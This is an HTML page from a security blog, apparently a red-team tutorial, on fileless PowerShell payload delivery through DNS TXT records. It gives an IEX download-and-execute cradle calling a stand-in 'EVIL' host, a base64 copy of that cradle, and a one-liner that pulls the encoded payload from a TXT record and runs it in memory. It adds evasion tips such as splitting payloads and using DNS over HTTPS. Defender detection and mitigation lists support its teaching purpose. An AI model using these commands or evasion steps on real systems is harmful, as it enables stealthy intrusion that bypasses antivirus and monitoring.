<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PS File Transfer via DNS Lookup</title>

  <!-- Essential Open Graph tags for LinkedIn -->
  <meta property="og:title" content="PowerShell File Transfer via DNS Lookup - Z3rotrace" />
  <meta property="og:description" content="Learn how to exfiltrate data using DNS queries with PowerShell. A stealthy technique for transferring files in restricted environments without direct network access." />
  <meta property="og:image" content="https://z3rotrace.live/assets/file_tranfer_dns.png" />
  <meta property="og:url" content="https://z3rotrace.live/writeups/ps-file-transfer-dns.html" />
  <meta property="og:type" content="article" />

  <!-- LinkedIn also reads Twitter Card tags as fallback -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="PowerShell File Transfer via DNS Lookup - Z3rotrace" />
  <meta name="twitter:description" content="Learn how to exfiltrate data using DNS queries with PowerShell. A stealthy technique for transferring files in restricted environments without direct network access." />
  <meta name="twitter:image" content="https://z3rotrace.live/assets/file_tranfer_dns.png" />

  <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
  <link rel="apple-touch-icon" href="../assets/favicon.png" />
<!--<link rel="stylesheet" href="https://pages-themes.github.io/hacker/assets/css/style.css"> -->
<link rel="stylesheet" href="../style.css?v=4"/>
</head>
<body>
<header>
  <h1 class="terminal-title" aria-label="Zerotrace Logs">
    <span class="prompt" aria-hidden="true">$</span>
    <span class="typed" id="term-typing" aria-hidden="true"></span>
    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
    <span class="sr-only">Zerotrace Logs</span>
  </h1>
</header>

<!-- Side hamburger control -->
<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
  <span class="sr-only">Toggle navigation</span>
  <span class="hamburger-icon" aria-hidden="true"></span>
</button>

<!-- Sidebar navigation -->
<aside class="sidebar" id="sidebar" aria-label="Main navigation">
  <div class="sidebar-header">
    <h3>Navigate</h3>
    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">√ó</span></button>
  </div>
  <div class="sidebar-content">
    <ul class="sidebar-nav">
      <li><a href="../index.html">Home</a></li>
      <li class="has-submenu">
        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Writeups</button>
        <ul class="submenu">
          <li><a href="ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
          <li><a href="sliver-c2-getting-started.html">Getting Started with Sliver C2</a></li>
        </ul>
      </li>
      <li><a href="../vector2.html">Machines Walkthroughs</a></li>
      <li><a href="../vector3.html">Certification Journey</a></li>
      <li><a href="../vector4.html">Projects</a></li>
    </ul>
  </div>
</aside>
<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>

<section>
  <h2>PowerShell File Transfer via DNS Lookup</h2>
  <p><img src="../assets/file_tranfer_dns.png" alt="File transfer via DNS"></p>

  <h3>Overview</h3>
  <p>This writeup demonstrates a fileless payload delivery technique using DNS TXT records and PowerShell. By leveraging DNS as a covert channel, we can execute malicious code entirely in memory without writing files to disk, bypassing traditional security controls that monitor file-based activity.</p>
  
  <p><strong>What you'll learn:</strong></p>
  <ul>
    <li>How to encode and embed PowerShell payloads in DNS TXT records</li>
    <li>Techniques for retrieving and executing code from DNS queries</li>
    <li>Why DNS is an effective covert channel for attackers</li>
    <li>Detection and mitigation strategies for defenders</li>
  </ul>

  <h3>Prerequisites</h3>
  <p>Before starting, ensure you have:</p>
  <ul>
    <li>PowerShell 3.0 or higher</li>
    <li>Access to a domain registrar (we'll use Namecheap in this example)</li>
    <li>Basic understanding of DNS and PowerShell</li>
    <li>Appropriate authorization for testing (use only in controlled environments)</li>
  </ul>

  <div class="disclaimer">
    <strong>‚ö†Ô∏è Legal Notice:</strong> This technique is demonstrated for educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before performing any security testing.
  </div>

  <h3>Understanding the Attack Chain</h3>

  <div class="question">
    <strong>Why DNS for File Transfers?</strong>
  </div>
  <div class="answer">
    Attackers leverage DNS for data transfer because it's one of the few outbound protocols almost always allowed through firewalls. By embedding payload data inside DNS queries or responses (like TXT records), they can bypass network egress restrictions or detection systems that monitor HTTP/HTTPS or FTP traffic. DNS is "noisy but trusted," making it ideal for covert communication or command and control.
  </div>

  <div class="question">
    <strong>Why Base64 Encoding?</strong>
  </div>
  <div class="answer">
    Base64 encoding doesn't encrypt the payload; it simply transforms binary data into ASCII text. This serves several purposes:
    <ul>
      <li>Prevents corruption or blocking when sending binary data over text-based protocols</li>
      <li>Ensures compatibility with DNS TXT record character limitations</li>
      <li>Provides basic obfuscation against simple string-based detection</li>
      <li>Prevents accidental alteration during transmission</li>
    </ul>
  </div>

  <div class="question">
    <strong>Why In-Memory Execution?</strong>
  </div>
  <div class="answer">
    Executing payloads directly in memory (fileless execution) avoids writing to disk, where most antivirus and EDR tools monitor and scan. Memory-only execution helps evade signature-based detection and leaves minimal forensic artifacts, allowing attackers to operate stealthily with a reduced intrusion footprint.
  </div>

  <h3>Step-by-Step Implementation</h3>

  <h3><span class="step">[Step 1]</span> Create Your PowerShell Payload</h3>
  <p>First, create a simple PowerShell script that will serve as your payload. For this example, we'll create <code>test.ps1</code>:</p>
  <pre><code class="language-powershell">IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")</code></pre>
  <p class="note"><strong>Note:</strong> This is a simple example that downloads and executes another script. In real scenarios, payloads can be much more sophisticated.</p>
  
  <h3><span class="step">[Step 2]</span> Convert Payload to Base64</h3>
  <p>To embed our payload in a DNS TXT record, we need to convert it to Base64 format. Use the following PowerShell command:</p>
  <pre><code class="language-powershell">[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\\Users\\peter\\Desktop\\test.ps1"))</code></pre>
  <p>This command reads the entire file as bytes and converts it to a Base64 string that looks something like:</p>
  <p><img src="../assets/image.png" alt="Base64 conversion screenshot"></p>
  <pre><code>SUVYIChOZXctT2JqZWN0IE5ldC5XZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCJodHRwOi8vRVZJTC9ldmlsLnBzMSIp</code></pre>
  <p class="note"><strong>Important:</strong> Copy this entire Base64 string; you'll need it for the next step.</p>

  <h3><span class="step">[Step 3]</span> Create DNS TXT Record</h3>
  <p>Now we'll embed our Base64-encoded payload in a DNS TXT record. Log into your domain registrar (Namecheap, GoDaddy, Cloudflare, etc.) and create a new TXT record:</p>
  <ul>
    <li><strong>Type:</strong> TXT Record</li>
    <li><strong>Host:</strong> @ (or a subdomain if preferred)</li>
    <li><strong>Value:</strong> Your Base64 string from Step 2</li>
    <li><strong>TTL:</strong> Automatic or 300 seconds</li>
  </ul>
  <p>You can use any domain registrar you prefer; in this example, I used Namecheap.</p>
  <p><img src="../assets/image 1.png" alt="TXT record screenshot"></p>
  <p>The TXT record should look like:</p>
  <pre><code>domain.com    TXT    "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCJodHRwOi8vRVZJTC9ldmlsLnBzMSIp"</code></pre>
  <p class="note"><strong>Pro tip:</strong> Some registrars have character limits for TXT records. For larger payloads, you may need to split them across multiple TXT records or subdomains.</p>

  <h3><span class="step">[Step 4]</span> Validate DNS Configuration</h3>
  <p>Before proceeding, verify that your DNS record propagated correctly using <code>nslookup</code>:</p>
  <pre><code>nslookup -querytype=txt yourdomain.com</code></pre>
  <p><img src="../assets/image 2.png" alt="nslookup validation screenshot"></p>
  <p>You should see your Base64 payload returned in the response. DNS propagation can take anywhere from a few minutes to 48 hours, though it's typically quick with modern DNS providers.</p>

  <h3><span class="step">[Step 5]</span> Execute the Payload</h3>
  <p>Finally, use this PowerShell one-liner to query the DNS TXT record, decode the Base64 payload, and execute it in memory:</p>
  <p class="note">Replace <strong>DOMAIN NAME</strong> with your domain (e.g., <code>example.com</code>).</p>
  <pre><code class="language-powershell">IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "DOMAIN NAME" | Select-String '\".*\"') -split '\"')[1])))</code></pre>

  <p><strong>Command breakdown:</strong></p>
  <ul>
    <li><code>nslookup -querytype=txt "yourdomain.com"</code> - Queries the TXT record</li>
    <li><code>Select-String '\".*\"'</code> - Extracts the quoted string containing our payload</li>
    <li><code>-split '\"'</code> - Splits the string by quotes</li>
    <li><code>[1]</code> - Selects the second element (the actual Base64 content)</li>
    <li><code>[System.Convert]::FromBase64String()</code> - Decodes from Base64</li>
    <li><code>[System.Text.Encoding]::UTF8.GetString()</code> - Converts bytes to UTF-8 string</li>
    <li><code>IEX</code> - Executes the resulting PowerShell code in memory</li>
  </ul>

  <h3 class="purple-text">Detection and Mitigation</h3>

  <h3><span class="step defender">üõ°Ô∏è For Defenders:</span> <span class="purple-text">Detection Strategies</span></h3>
  <ul>
    <li>Monitor for unusually large DNS TXT record queries</li>
    <li>Look for Base64-encoded strings in DNS traffic</li>
    <li>Analyze PowerShell command-line arguments containing <code>IEX</code>, <code>nslookup</code>, and <code>FromBase64String</code></li>
    <li>Enable PowerShell script block logging to capture suspicious commands</li>
    <li>Implement DNS query logging and establish baselines for normal TXT record queries</li>
  </ul>

  <h3><span class="step defender">üõ°Ô∏è For Defenders:</span> <span class="purple-text">Mitigation Techniques</span></h3>
  <ul>
    <li>Restrict PowerShell execution policies</li>
    <li>Implement application whitelisting</li>
    <li>Use DNS filtering to block known malicious domains</li>
    <li>Deploy EDR solutions that monitor PowerShell behavior</li>
    <li>Configure Windows Defender Application Control (WDAC)</li>
    <li>Enable PowerShell Constrained Language Mode in sensitive environments</li>
  </ul>

  <h3><span class="step redteam">‚öîÔ∏è For Red Teamers:</span> <span class="purple-text">Operational Security</span></h3>
  <ul>
    <li>Use legitimate-looking domain names</li>
    <li>Implement delays between queries to avoid detection</li>
    <li>Split payloads across multiple subdomains</li>
    <li>Combine with other evasion techniques</li>
    <li>Consider DNS over HTTPS (DoH) to bypass traditional DNS monitoring</li>
  </ul>

  <h3>Key Takeaways</h3>
  <div class="answer">
    This technique demonstrates how PowerShell can execute code entirely in memory without writing to disk, using DNS as a covert delivery channel. By retrieving and decoding commands from a DNS TXT record and executing them with <code>IEX</code>, we create a fileless, multi-stage execution chain that:
    <ul>
      <li>Bypasses traditional antivirus detection</li>
      <li>Leaves minimal forensic artifacts</li>
      <li>Exploits trusted network protocols</li>
      <li>Demonstrates the importance of monitoring PowerShell activity</li>
    </ul>
    <p>Understanding both the offensive technique and defensive countermeasures is essential for modern security professionals.</p>
  </div>
</section>

<footer>
  <div class="social-links" aria-label="Social media">
    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
      </svg>
    </a>
    <a href="mailto:contact@z3rotrace.live" class="social email" aria-label="E-mail">
      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <path fill="#00B8D9" d="M502.3 190.8L327.4 338.9C304.3 358.3 271.7 358.3 248.6 338.9L9.7 190.8C3.2 185.5 0 178.3 0 171.2V80C0 53.5 21.5 32 48 32H464C490.5 32 512 53.5 512 80V171.2C512 178.3 508.8 185.5 502.3 190.8Z"/>
        <path fill="#00B8D9" d="M0 255.1V432C0 458.5 21.5 480 48 480H464C490.5 480 512 458.5 512 432V255.1L343.9 392.7C304.5 423 247.6 423 208.1 392.7L0 255.1Z"/>
      </svg>
    </a>
    <a href="https://www.linkedin.com/in/zerotrace/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
      </svg>
    </a>
  </div>
  <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
</footer>
<script src="../script.js"></script>
</body>
</html>
